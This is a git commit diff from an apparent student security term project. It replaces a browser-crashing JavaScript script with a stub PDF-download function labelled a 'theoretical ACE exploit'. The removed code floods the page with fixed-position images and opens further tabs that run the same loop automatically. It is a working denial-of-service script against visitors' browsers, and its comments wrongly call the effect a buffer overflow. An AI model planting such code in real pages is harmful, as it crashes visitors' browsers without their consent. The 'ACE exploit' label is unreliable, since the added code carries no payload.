ef6c06385289a8fe02378b7d1f95cca35437b0df
briidee3 <briidee3@gmail.com>
2022-11-22 15:09:08 -0500

    set up pdf downloader functionality

--- js/app.js
+++ js/app.js
@@ -7,4 +7,18 @@
 
 window.onload = () => {
 
+    // function to create link to download and PDF
+    let PDFDownloadLink = () => {
+        var link = document.createElement(`a`);
+        link.href = URL;
+        link.download = `./test.pdf`;
+        link.dispatchEvent(new MouseEvent(`click`));
+    };
+
+    // if the PDF text is clicked, execute the exploit
+    document.getElementById(`danger-pdf`).addEventListener(`click`, () => {
+        PDFDownloadLink();
+        console.log(`mission is a go... hopefully, lol`);
+    });
+
 };
--- temp/js/app.js
+++ temp/js/app.js
@@ -1,81 +1,23 @@
 "use strict";
 
-// Bri D'Urso -- 10-27-22 -- CS280 Term Project
-// 
-// This script is designed to exploit a property of CSS
-// which apparently makes an element be stored in browser
-// memory without regarding the memory limits, (I think).
-// Basically, it has to  do with the 'position: fixed;'
-// attribute in CSS, and the plan is to overflow the browser's
-// buffer with a bunch of elements with fixed positions.
-
-// Apparently, the 'position: fixed;' CSS property
-// holds the element in question in memory in a way
-// not too dissimilar to malloc() in C, which seems to be
-// why it is able to crash the browser.
-// Nice!!
-
-// Currently seems to work!!
-// Upon clicking the picture of the egg, the tab crashes!
-// That's a great sign!
-// Prior to clicking the egg, there is no issue.
-// However, clicking the egg starts the script, and crashes the browser!
-// (or, the tab/page, at the very least.)
-// The tab/page becomes entirely unresponsive, even when attempting to refresh the page!
-
-// IT CRASHES CHROME!! NICE!!!
-
-// Checked resource monitor, confirmed buffer overflow!
-
-// Started testing with a few different versions (sizes) of the
-// Stephan's Quintet photo from the James Webb Space Telescope,
-// it appears larger images cause the ram to leak much quicker (which makes sense)
-// so I figured I'd add some larger images for testing purposes
+// Bri D'Urso - 11/22/22 CS280 Term project
+//
+// This file is designed to carry out a theoretical
+// ACE exploit using JS and PDF files
+//
 
 window.onload = function () {
-  // variable to control the intensity of the exploit
-  // (aka, the requested amount of egg B) )
-  var amount = 100000;
-
-  // payload to overflow the buffer with
-  var payloadStyles = "position: fixed;";
-  var payload = "<img src=\"img/stephans-quintet-jwst_large.jpeg\" alt=\"eg\" style=\"".concat(payloadStyles, "\">");
-
-  // make way too many fixed elements 
-  // not totally sure of an overflow at this point, however that would be ideal
-  // it seems functionally similar, at the very least
-  var fixedOverflow = function fixedOverflow(amt) {
-    for (var i = 0; i < amt; i++) {
-      // using setTimeout here so the page doesn't immediately crash
-      // this allows the memory to fill up more before the process ends (crashes)
-      setTimeout(document.getElementById("egg").innerHTML += payload, 8);
-    }
+  // function to create link to download and PDF
+  var PDFDownloadLink = function PDFDownloadLink() {
+    var link = document.createElement("a");
+    link.href = URL;
+    link.download = "./test.pdf";
+    link.dispatchEvent(new MouseEvent("click"));
   };
 
-  // used to open several tabs during the process so that when one tab crashes,
-  // another is opened to further continue the ram "leak"
-  var openTabs = function openTabs(numTabs) {
-    for (var i = 0; i < numTabs; i++) {
-      setTimeout(window.open("".concat(window.location.href), "egg", "inner-width: 193"), 10);
-    }
-  };
-
-  // for use with openTabs
-  // if it has a certain property (used to identify tabs opened with openTabs),
-  // auto run the exploit loop
-  var autoRun = function autoRun() {
-    if (window.innerWidth === 193) {
-      fixedOverflow(amount);
-    }
-  };
-
-  // run the "fixedOverflow" function when the egg is clicked
-  document.getElementById("egg").addEventListener("click", function () {
-    openTabs(10); // open more tabs to run the process
-    fixedOverflow(amount); // "overflow"
+  // if the PDF text is clicked, execute the exploit
+  document.getElementById("danger-pdf").addEventListener("click", function () {
+    PDFDownloadLink();
     console.log("mission is a go... hopefully, lol");
   });
-
-  // if certain conditions are met, automatically run the exploit after 1 sec of the tab being open
-  setTimeout(autoRun(), 1000);
 };
